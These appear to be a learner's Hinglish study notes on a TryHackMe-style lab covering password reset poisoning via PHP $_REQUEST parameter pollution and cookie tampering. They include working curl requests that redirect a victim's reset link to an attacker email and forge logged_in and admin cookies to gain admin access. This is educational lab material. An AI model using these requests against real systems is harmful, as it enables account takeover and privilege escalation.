3-logic flaw
pass reset poisoning
 Big picture: App ka scene kya hai?

Acme IT Support website ka password reset flow:

1️ Step 1
Tu email daalta hai
→ app check karta:
“Account exists or not?”

2️ Step 2
Tu username daalta hai
→ app bolta:
“Password reset email bhej diya.”

 Vulnerability kahan hai?

App internally:

Email GET parameter se leta hai

Username POST body se leta hai

But actual email bhejne ke time:

 PHP $_REQUEST variable use karta hai

 PHP $_REQUEST ka chutiya logic

$_REQUEST =
GET + POST + COOKIE ka mix

Aur agar same key name dono me ho:

email=robert@acmeitsupport.thm   (GET)
email=attacker@hacker.com       (POST)


PHP bolta hai:

POST waala email zyada important 

 So attack kya hai?

Normal request:

curl 'http://10.49.173.5/customers/reset?email=robert@acmeitsupport.thm' \
-d 'username=robert'


→ Reset email goes to robert@acmeitsupport.thm

But attacker version 
curl 'http://10.49.173.5/customers/reset?email=robert@acmeitsupport.thm' \
-d 'username=robert&email=attacker@hacker.com'


Now:

App verifies Robert using GET email

But sends reset link to POST email 
→ attacker@hacker.com

 So what did we just do?

We tricked the app into:

“Reset Robert’s password
but send link to attacker.”

This is called:

 Password Reset Poisoning
 Parameter Pollution
 Logic Flaw

 Ab last part kya bol raha hai?

They say:

1️ Create your own account
on Acme IT support.

You’ll get email like:

yourname@customer.acmeitsupport.thm


2️ Run this evil curl again
but change POST email to YOUR email:

curl 'http://10.49.173.5/customers/reset?email=robert@acmeitsupport.thm' \
-d 'username=robert&email=yourname@customer.acmeitsupport.thm'


3️ What happens?

App thinks:

“Robert asked for reset.”

But reset link goes to:

yourname@customer.acmeitsupport.thm

4️ Where does that link show up?

In your support tickets
(because Acme IT Support emails = ticket system)

5️ Open ticket → click link
→ You’re now logged in as Robert 

6️ Go to Robert’s support tickets
→ One of them has a flag 

 So final answer logic

They’re asking:

“What is the flag from Robert’s support ticket?”

Meaning:

You must:

Exploit reset poisoning

Hijack Robert’s account

Read his ticket

Copy the flag string

 One-liner explanation

App verifies user using GET email
but sends reset link using POST email
because of PHP $_REQUEST.
So attacker hijacks password reset. 

 Ultra-simple TL;DR

1️ App uses GET + POST badly
2️ POST email overrides GET email
3️ Reset link sent to attacker
4️ Attacker logs in as Robert
5️ Attacker reads flag from ticket

 What vulnerability is this?

Password Reset Poisoning
Parameter Pollution
Business Logic Flaw
CWE-640

One-Line Conclusion

The application validates the victim’s identity using GET parameters but delivers the reset link using POST parameters, enabling password reset poisoning through parameter pollution.


4- cookie tampering
we send curl requests to the page and try to edit the cookies by making admin=true and get the admin privileges after logging in using logged_in=true

Examining and editing the cookies set by the web server during your online session can have multiple outcomes, such as unauthenticated access, access to another user's account, or elevated privileges. If you need a refresher on cookies, check out the HTTP In Detail room on task 6.



Plain Text

The contents of some cookies can be in plain text, and it is obvious what they do. Take, for example, if these were the cookie set after a successful login:

Set-Cookie: logged_in=true; Max-Age=3600; Path=/
Set-Cookie: admin=false; Max-Age=3600; Path=/

We see one cookie (logged_in), which appears to control whether the user is currently logged in or not, and another (admin), which controls whether the visitor has admin privileges. Using this logic, if we were to change the contents of the cookies and make a request we'll be able to change our privileges.

First, we'll start just by requesting the target page:

Curl Request 1
user@tryhackme$ curl http://10.49.173.5/cookie-test
We can see we are returned a message of: Not Logged In

Now we'll send another request with the logged_in cookie set to true and the admin cookie set to false:

Curl Request 2
user@tryhackme$ curl -H "Cookie: logged_in=true; admin=false" http://10.49.173.5/cookie-test
We are given the message: Logged In As A User

Finally, we'll send one last request setting both the logged_in and admin cookie to true:

Curl Request 3
user@tryhackme$ curl -H "Cookie: logged_in=true; admin=true" http://10.49.173.5/cookie-test
This returns the result: Logged In As An Admin as well as a flag which you can use to answer question one.

